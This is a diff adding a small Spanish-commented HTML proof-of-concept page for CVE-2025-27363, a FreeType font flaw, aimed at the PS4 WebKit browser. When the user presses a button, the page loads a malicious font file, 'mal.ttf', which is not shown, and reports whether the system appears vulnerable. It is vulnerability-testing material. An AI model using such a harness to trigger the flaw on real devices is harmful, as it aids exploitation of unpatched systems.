@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>PoC CVE-2025-27363</title>
+  <style>
+	/* Solo por las bromas, fondo negro y texto verde XD*/
+    body {
+      font-family: monospace;
+      background: #000;
+      color: #0f0;
+      padding: 2em;
+      font-size: 18px;
+    }
+    .log {
+      white-space: pre-wrap;
+      margin-top: 2em;
+      background: #111;
+      padding: 1em;
+      border: 1px solid #0f0;
+    }
+    .status {
+      margin-top: 2em;
+      font-size: 32px;
+    }
+    .ok {
+      color: lime;
+    }
+    .fail {
+      color: red;
+    }
+    .glyph-test {
+      font-size: 100px;
+      margin-top: 0em;
+    }
+  </style>
+</head>
+<body>
+  <h1>PS4-FreeType-WebKit-Poc</h1>
+  <div class="glyph-test" id="glyph">%%%%%%%%%%%</div>
+  <button onclick="startPoC()">Start</button>
+  <div class="log" id="log">Esperando...</div>
+  <div class="status" id="status">Sin Iniciar</div>
+
+
+  <script>
+    const logElem = document.getElementById('log');
+    const statusElem = document.getElementById('status');
+    const glyphElem = document.getElementById('glyph');
+
+    const log = msg => {
+      logElem.innerText += msg + "\n";
+    };
+
+    async function startPoC() {
+      logElem.innerText = "Iniciando PoC...\n";
+      statusElem.innerText = "";
+      glyphElem.style.fontFamily = "monospace";
+      glyphElem.style.color = "#0f0";
+
+      const font_face = new FontFace('foo', 'url("mal.ttf")');
+
+      try {
+        await font_face.load();
+        log("✅ Font loaded.");
+        document.fonts.add(font_face);
+        glyphElem.style.fontFamily = 'foo';
+        glyphElem.style.color = 'red';
+        log("✅ Font used.");
+        statusElem.className = "ok";
+        statusElem.textContent = "✅ Fuente aplicada correctamente. Si ves los simbolos `%` Poc correcta, sistema vulnerable. No visibles, sistema parcheado.";
+      } catch (err) {
+        log("❌ Font failed to load.");
+        statusElem.className = "fail";
+        statusElem.textContent = "❌ Error al cargar fuente. PoC no ejecutada.";
+      }
+    }
+  </script>
+</body>
+</html>
